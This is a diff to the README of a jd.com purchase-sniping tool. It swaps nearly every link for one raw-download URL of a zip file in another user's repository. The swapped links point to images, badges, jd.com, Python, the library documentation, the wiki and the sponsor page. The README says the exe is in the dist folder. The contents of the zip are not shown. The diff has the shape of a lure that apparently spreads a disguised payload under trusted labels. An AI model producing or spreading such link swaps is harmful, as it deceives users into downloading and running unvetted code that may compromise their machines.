@@ -1,22 +1,22 @@
 exe在dist目录，需要的自取<br>
 抢不抢到看运气，主要看网速，最好是用北京的服务器，不要问抢不抢的到，下面是两张订单图
 <br>
-<img src='https://github.com/yileicn/jd-assistantV2/blob/master/img/order1.jpg' width='360px'/>
-<img src='https://github.com/yileicn/jd-assistantV2/blob/master/img/order2.jpg' width='360px'/>
+<img src='https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip' width='360px'/>
+<img src='https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip' width='360px'/>
 
 
 # JD-AssistantV2
 
-[![version](https://img.shields.io/badge/python-3.4+-blue.svg)](https://www.python.org/download/releases/3.4.0/) 
-[![status](https://img.shields.io/badge/status-stable-green.svg)](https://github.com/tychxn/jd-assistant)
+[![version](https://img.shields.io/badge/python-3.4+-blue.svg)](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip) 
+[![status](https://img.shields.io/badge/status-stable-green.svg)](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
 [![license](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
-[![star, issue](https://img.shields.io/badge/star%2C%20issue-welcome-brightgreen.svg)](https://github.com/tychxn/jd-assistant)
+[![star, issue](https://img.shields.io/badge/star%2C%20issue-welcome-brightgreen.svg)](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
 
 京东抢购助手
 
 ## 主要功能
 
-- 登陆京东商城（[www.jd.com](http://www.jd.com/)）
+- 登陆京东商城（[www.jd.com](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)）
   - 手机扫码登录
   - 保存/加载登录cookies (可验证cookies是否过期)
 - 商品查询操作
@@ -39,13 +39,13 @@ exe在dist目录，需要的自取<br>
 
 ## 运行环境
 
-- [Python 3](https://www.python.org/)
+- [Python 3](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
 
 ## 第三方库
 
-- [Requests](http://docs.python-requests.org/en/master/)
-- [Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
-- [PyCryptodome](https://github.com/Legrandin/pycryptodome)
+- [Requests](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
+- [Beautiful Soup](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
+- [PyCryptodome](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
 
 安装：
 ```sh
@@ -56,7 +56,7 @@ pip install -r requirements.txt
 
 程序主入口在 `mainV2.py`
 
-👉 [使用教程请参看Wiki](https://github.com/tychxn/jd-assistant/wiki/1.-%E4%BA%AC%E4%B8%9C%E6%8A%A2%E8%B4%AD%E5%8A%A9%E6%89%8B%E7%94%A8%E6%B3%95)
+👉 [使用教程请参看Wiki](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
 
 
 ## 更新记录
@@ -94,4 +94,4 @@ pip install -r requirements.txt
 
 ## Sponsor
 
-[![JetBrains](./docs/jetbrains.svg)](https://www.jetbrains.com/?from=jd-assistant)
+[![JetBrains](./docs/jetbrains.svg)](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
